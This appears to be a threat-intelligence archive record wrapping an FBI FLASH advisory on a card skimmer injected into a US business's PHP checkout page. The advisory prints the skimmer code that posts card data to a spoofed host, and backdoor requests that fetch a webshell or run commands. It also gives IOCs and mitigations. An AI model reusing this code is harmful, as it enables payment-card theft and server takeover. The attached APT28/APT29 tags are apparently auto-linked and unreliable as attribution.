{
    "id": "b27b34e5-dbfc-4c76-b50b-46715d7b8d79",
    "created_at": "2022-10-25T16:48:10.95646Z",
    "updated_at": "2025-03-27T02:17:11.279942Z",
    "deleted_at": null,
    "sha1_hash": "2f300c75d17a20c240a5fe7979bd4fed604e405e",
    "title": "",
    "authors": "",
    "file_creation_date": "2022-05-16T11:05:26Z",
    "file_modification_date": "2022-05-16T11:05:26Z",
    "file_size": 1389950,
    "plain_text": "## 16 May 2022 The following information is being provided by the FBI, with no guarantees or warranties, for potential\n\n_use at the sole discretion of recipients to protect against cyber threats. This data is provided in order_\n_to help cyber security professionals and system administrators to guard against the persistent malicious_\n\nFLASH Number\n\n_actions of cyber actors. This FLASH was coordinated with DHS/CISA._\n\n#### MC-000170-MW This FLASH has been released TLP:WHITE\n\n\n**WE NEED YOUR HELP!** If you identify any suspicious activity within your enterprise or have related information,\n\nplease contact your local FBI Cyber Squad immediately with respect to the procedures outlined in the\n\nReporting Notice section of this message.\n\n*Note: By reporting any related information to FBI Cyber Squads, you are assisting in sharing information that allows the FBI to track\n\n_malicious actors and coordinate with private industry and the United States Government to prevent future intrusions and attacks._\n\n# Cyber Actors Scrape Credit Card Data from US Business’\n\n Online Checkout Page and Maintain Persistence by\n\n Injecting Malicious PHP Code\n\n## Summary\n\nAs of January 2022, unidentified cyber actors unlawfully scraped credit card data from a US\nbusiness by injecting malicious PHP Hypertext Preprocessor (PHP) code into the business’ online\ncheckout page and sending the scraped data to an actor-controlled server that spoofed a\nlegitimate card processing server. The unidentified cyber actors also established backdoor\naccess to the victim’s system by modifying two files within the checkout page. The FBI has\nidentified and is sharing new indicators of compromise (IOCs), which may assist in network\ndefense.\n\n\n-----\n\n## Technical Details\n\nUnidentified cyber actors began targeting a US business in September 2020 from three Internet\nprotocol (IP) addresses: 80.249.207.19, 80.82.64.211, and 80.249.206.197. The\nactors inserted malicious PHP code into the business’s customized online checkout page,\n```\ncheckout.php, by altering the associated TempOrders.php file. The checkout page was\n\n```\nmodified with the following include()statement:\n```\n        include(“includes/cart_required_files.php”)\n\n```\n_Figure 1: Example include() statement_\n```\ninclude()statements allow developers to import PHP code from one file into another file,\n\n```\nwhich decreases the number of files developers must modify to update their code. Malicious\nactors exploited this capability to insert the contents of TempOrders.php into the checkout\n```\ncart_required_files.php file. This cart_required_files.php file contained\n\n```\na require_once() statement that is nearly identical to the include() statement, except\nthat if the identified file cannot be found, a warning is shown and program execution continues.\n```\n      require_once(“$root/cart/config/TempOrders.php”)\n\n```\n_Figure 2: Example “require_once” function_\n\nAs of January 2022, the unidentified cyber actors used the require_once() function to call\nand execute the TempOrders.php file, which contained code used to scrape and exfiltrate\ncustomer data from the US business’ shopping cart to a victim-specific PHP file\n“file_name.php”:\n```\n$curl = curl_init(); \n    curl_setopt($curl, CURLOPT_URL,\n'http://authorizen.net/file_name.php');\n    curl_setopt($curl, CURLOPT_POST, true);\n    curl_setopt($curl, CURLOPT_POSTFIELDS,       \n\"data=\".base64_encode($_POST['cc'].\"|\".$_POST['exp'].\"|\".$_POST['cvv'\n].\"|\".$_POST['name'].\"|\".$var[XXX].\"|\".$var[XXX].\"|\".$var[XXX].\"|\".$v\nar[XXX].\"|\".$var[XXX].\"|\".$var[XXX]));\n    $out = curl_exec($curl);\n    curl_close($curl);\n\n```\n_Figure 3: Example code from TempOrders.php file identified on victim host_\n\nThe malicious code posts the customer’s payment information to a spoofed card processing\ndomain, http://authorizen[.]net/, where the ‘n’ is added to impersonate or spoof\n```\nhttp://authorize[.]net/, a legitimate card processing company’s domain. The\n\n```\nunidentified cyber actors also established backdoor access to the business’ system by modifying\ntwo files.\n\n\n-----\n\nFirst, the actors established a rudimentary back door by inserting the\n`assert($_REQUEST['login'])` function. This function is designed for debugging and\nwhen called executes code submitted as the HTTP request parameter “login”. Upon execution,\nthe system downloads a fully functional P.A.S. webshell onto the affected company’s\nwebserver.\n```\nhttp://www.company.com/legit.php?login=system(curl -O\nhttps://raw.githubusercontetn.com//cr1f/P.A.S.Fork/main/file_name.php’)\n\n```\n_Figure 4: Example of code used to establish a rudimentary back door_\n\nSecond, the actors inserted the PHP regular expression\n```\n@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"), which is designed to insert and\n\n```\nexecute PHP code submitted as an HTTP request variable named “u”.\n\n```\nhttp://www.company.com/otherLegitFile.php?u=system('ls -la;')\n\n```\n_Figure 5: Example of HTTP request used to execute PHP code and enable the back door_\n\nUsing the described techniques, the actors downloaded two PHP Webshells, P.A.S. and b374,\nwhich were leveraged as backdoors for further exploitation.\n\n## Indicators\n\nThe following Internet Protocol (IP) addresses and Uniform Resource Locators (URLs) were used\nduring vulnerability exploitation and/or data exfiltration:\n\n**IP Addresses** **Uniform Resource Locators (URLs)**\n80.249.207.19 N/A\n80.82.64.211 N/A\n80.249.206.197 N/A\n\nThe following malware tools were used during the captioned intrusion:\n\n**Filename** pas.php\nMD5: 73B4EF0EDA0BF07EF4DC1C543F668018\nSHA256: Ac28e5f136e9307d965466f77cf0845dc4cf08a701323ab4fbc66d91b28cfab9\nSHA1: 6f81a02b802d17e9dc7fc846eb1ce8f14e10b813\nFile Size: 15.68 KB (16059 bytes)\nFile Type: Unknown\nNote: P.A.S. webshell (aka Fobushell) was developed and published by Ukrainian\ndeveloper Jaroslav Volodimirovich Panchenko (aka Profexer). In December 2016,\nthe Department of Homeland Security published a report concerning attacks on\nthe 2016 U.S. elections, which identified P.A.S. as a tool used by Russian\nIntelligence Services (referenced by the DHS as “GRIZZLY STEPPE”).\n\n|IP Addresses|Uniform Resource Locators (URLs)|\n|---|---|\n|80.249.207.19|N/A|\n|80.82.64.211|N/A|\n|80.249.206.197|N/A|\n\n|Filename|pas.php|\n|---|---|\n|MD5:|73B4EF0EDA0BF07EF4DC1C543F668018|\n|SHA256:|Ac28e5f136e9307d965466f77cf0845dc4cf08a701323ab4fbc66d91b28cfab9|\n|SHA1:|6f81a02b802d17e9dc7fc846eb1ce8f14e10b813|\n|File Size:|15.68 KB (16059 bytes)|\n|File Type:|Unknown|\n|Note:|P.A.S. webshell (aka Fobushell) was developed and published by Ukrainian developer Jaroslav Volodimirovich Panchenko (aka Profexer). In December 2016, the Department of Homeland Security published a report concerning attacks on the 2016 U.S. elections, which identified P.A.S. as a tool used by Russian Intelligence Services (referenced by the DHS as “GRIZZLY STEPPE”).|\n\n\n-----\n\n**Filename** log.php\nMD5: 0D43648311AC978702538CF1AC4E1257\nSHA256: 9a0023406283d9856b07b2d39b4444130001f86131841df2eba206f0ae379b6c\nSHA1: 595ce84634536b3a2cc0d6dd05af7003ce8ed04a\nFile Size: 97.23 KB (99559 bytes)\nFile Type: PHP\nNote: This was a webshell published at Github.com/b374k/b374k.\n\n**Filename** Index.php\nMD5: 05A7373DAA77917128535C76B2B363FE\nSHA256: 0b754dee14703b23b97dbb50baa5b83931003f0744822eb6a76b0291fb1e6587\nSHA1: 5d46d944af2a9dda829a653856c7ea9ec723dfc5\nFile Size: 206.25 KB (211204 bytes)\nFile Type: unknown\nNote: Adminer is a legitimate PHP-based database tool. This tool is commonly used for\nmanaging content in MySQL databases, but it should not be exposed to the\npublic as a general security practice.\n\nPHP Code: The PHP code below is an example of how the unidentified cyber actors modified\nthe target company’s code. The first three lines, beginning with “$this”, are actual code from\nthe company’s shopping cart, and the remaining lines, beginning with “curl” were added by the\nactors.\n```\n$this->streamAccess=$var[XXX];\n$this->username=$var[XXX];\n$this->originalZip=$var[XXX];\n$curl = curl_init();\ncurl_setopt($curl, CURLOPT_URL, 'http://authorizen.net/\nfile_name.php');\ncurl_setopt($curl, CURLOPT_POST, true);\ncurl_setopt($curl, CURLOPT_POSTFIELDS,\n\"data=\".base64_encode($_POST['cc'].\"|\".$_POST['exp'].\"|\".$_POST['cvv'\n].\"|\".$_POST['name'].\"|\".$var[XXX].\"|\".\n$var[XXX].\"|\".$var[XXX].\"|\".$var[XXX].\"|\".$var[XXX $out =\ncurl_exec($curl);\ncurl_close($curl);\n}\n}\n\n```\n_Figure 6: Example of code used to modify the target’s shopping cart_\n\n## Recommended Mitigations:\n\n  - Update and patch all systems, to include operating systems, software, and any third\nparty code running as part of your website.\n\n|Filename|log.php|\n|---|---|\n|MD5:|0D43648311AC978702538CF1AC4E1257|\n|SHA256:|9a0023406283d9856b07b2d39b4444130001f86131841df2eba206f0ae379b6c|\n|SHA1:|595ce84634536b3a2cc0d6dd05af7003ce8ed04a|\n|File Size:|97.23 KB (99559 bytes)|\n|File Type:|PHP|\n|Note:|This was a webshell published at Github.com/b374k/b374k.|\n\n|Filename|Index.php|\n|---|---|\n|MD5:|05A7373DAA77917128535C76B2B363FE|\n|SHA256:|0b754dee14703b23b97dbb50baa5b83931003f0744822eb6a76b0291fb1e6587|\n|SHA1:|5d46d944af2a9dda829a653856c7ea9ec723dfc5|\n|File Size:|206.25 KB (211204 bytes)|\n|File Type:|unknown|\n|Note:|Adminer is a legitimate PHP-based database tool. This tool is commonly used for managing content in MySQL databases, but it should not be exposed to the public as a general security practice.|\n\n\n-----\n\n  - Change default login credentials on all systems.\n\n  - Monitor requests performed against your e-commerce environment to identify possible\n\nmalicious activity.\n\n  - Segregate and segment network systems to limit how easily cyber criminals can move\n\nfrom one to another.\n\n  - Secure all websites transferring sensitive information by using secure socket layer (SSL)\n\nprotocol.\n\n  - Install third-party software/hardware from trusted sources. Coordinate with the\n\nmanufacturer to ensure their security protocols prevent unauthorized access to data\nthey store and/or process.\n\n  - Patch all systems for critical vulnerabilities, prioritizing timely patching of internet\nconnected servers for known vulnerabilities and software processing internet data, such\nas web browsers, browser plugins, and document readers.\n\n  - Actively scan and monitor web logs and web applications for unauthorized access,\n\nmodification, and anomalous activities.\n\n  - Strengthen credential requirements and implement multifactor authentication to\n\nprotect individual accounts.\n\n  - Conduct regular backups to reduce recovery time in the event of a compromise or cyber\n\nintrusion.\n\n  - Maintain an updated Incident Response Plan addressing cyber threat response.\n\n## Reporting Notice\n\nThe FBI encourages recipients of this document to report information concerning suspicious or\ncriminal activity to their local FBI field office. With regards to specific information that appears\nin this communication; the context, individual indicators, particularly those of a nondeterministic or ephemeral nature (such as filenames or IP addresses), may not be indicative of\na compromise. Indicators should always be evaluated in light of your complete information\nsecurity situation.\n\nField office contacts can be identified at www.fbi.gov/contact-us/field-offices. When available,\neach report submitted should include the date, time, location, type of activity, number of\npeople, and type of equipment used for the activity, the name of the submitting company or\norganization, and a designated point of contact.\n\n## Administrative Note\n\nThis product is marked TLP:WHITE. Subject to standard copyright rules, the information in this product\nmay be shared without restriction.\n\n\n-----\n\n### Your Feedback Regarding this Product is Critical\n\n#### Was this product of value to your organization? Was the content clear and concise?  Your comments are very important to us and can be submitted anonymously. Please take a moment to complete the survey at the link below. Feedback should be specific to your experience with our written products to enable the FBI to make quick and continuous improvements to such products. Feedback may be submitted online here:\n\n## https://www.ic3.gov/PIFSurvey\n\n#### Please note that this survey is for feedback on content and value only. Reporting of technical information regarding FLASH reports must be submitted through your local FBI Field Office.\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://www.ic3.gov/Media/News/2022/220516.pdf"
    ],
    "report_names": [
        "220516.pdf"
    ],
    "threat_actors": [
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "46b3c0fc-fa0c-4d63-a38a-b33a524561fb",
            "created_at": "2023-01-06T13:46:38.393409Z",
            "updated_at": "2025-03-27T02:00:02.822155Z",
            "deleted_at": null,
            "main_name": "APT29",
            "aliases": [
                "The Dukes",
                "Minidionis",
                "Grizzly Steppe",
                "G0016",
                "Blue Kitsune",
                "BlueBravo",
                "SeaDuke",
                "Cloaked Ursa",
                "YTTRIUM",
                "ATK7",
                "Nobelium",
                "UAC-0029",
                "Group 100",
                "COZY BEAR",
                "IRON HEMLOCK",
                "TA421",
                "ITG11"
            ],
            "source_name": "MISPGALAXY:APT29",
            "tools": [
                "QUARTERRIG",
                "SNOWYAMBER",
                "HALFRIG"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f27790ff-4ee0-40a5-9c84-2b523a9d3270",
            "created_at": "2022-10-25T16:07:23.341684Z",
            "updated_at": "2025-03-27T02:02:09.74554Z",
            "deleted_at": null,
            "main_name": "APT 29",
            "aliases": [
                "APT 29",
                "ATK 7",
                "Blue Dev 5",
                "BlueBravo",
                "Cloaked Ursa",
                "CloudLook",
                "Cozy Bear",
                "Dark Halo",
                "Earth Koshchei",
                "Grizzly Steppe",
                "Group 100",
                "ITG11",
                "Iron Hemlock",
                "Iron Ritual",
                "Midnight Blizzard",
                "Minidionis",
                "Nobelium",
                "NobleBaron",
                "Operation Ghost",
                "Operation Office monkeys",
                "Operation StellarParticle",
                "SilverFish",
                "Solar Phoenix",
                "SolarStorm",
                "StellarParticle",
                "TEMP.Monkeys",
                "The Dukes",
                "UNC2452",
                "UNC3524",
                "Yttrium"
            ],
            "source_name": "ETDA:APT 29",
            "tools": [
                "7-Zip",
                "ATI-Agent",
                "AdFind",
                "Agentemis",
                "AtNow",
                "BEATDROP",
                "BotgenStudios",
                "CEELOADER",
                "Cloud Duke",
                "CloudDuke",
                "CloudLook",
                "Cobalt Strike",
                "CobaltStrike",
                "CosmicDuke",
                "Cozer",
                "CozyBear",
                "CozyCar",
                "CozyDuke",
                "Danfuan",
                "EnvyScout",
                "EuroAPT",
                "FatDuke",
                "FoggyWeb",
                "GeminiDuke",
                "Geppei",
                "GoldFinder",
                "GoldMax",
                "GraphDrop",
                "GraphicalNeutrino",
                "GraphicalProton",
                "HAMMERTOSS",
                "HammerDuke",
                "LOLBAS",
                "LOLBins",
                "LiteDuke",
                "Living off the Land",
                "MagicWeb",
                "Mimikatz",
                "MiniDionis",
                "MiniDuke",
                "NemesisGemina",
                "NetDuke",
                "OnionDuke",
                "POSHSPY",
                "PinchDuke",
                "PolyglotDuke",
                "PowerDuke",
                "QUIETEXIT",
                "ROOTSAW",
                "RegDuke",
                "Rubeus",
                "SNOWYAMBER",
                "SPICYBEAT",
                "SUNSHUTTLE",
                "SeaDaddy",
                "SeaDask",
                "SeaDesk",
                "SeaDuke",
                "Sharp-SMBExec",
                "SharpView",
                "Sibot",
                "Solorigate",
                "SoreFang",
                "TinyBaron",
                "WINELOADER",
                "WellMail",
                "WellMess",
                "cobeacon",
                "elf.wellmess",
                "reGeorg",
                "tDiscoverer"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716490,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1652699126,
    "ts_modification_date": 1652699126,
    "files": {
        "pdf": "https://archive.orkl.eu/2f300c75d17a20c240a5fe7979bd4fed604e405e.pdf",
        "text": "https://archive.orkl.eu/2f300c75d17a20c240a5fe7979bd4fed604e405e.txt",
        "img": "https://archive.orkl.eu/2f300c75d17a20c240a5fe7979bd4fed604e405e.jpg"
    }
}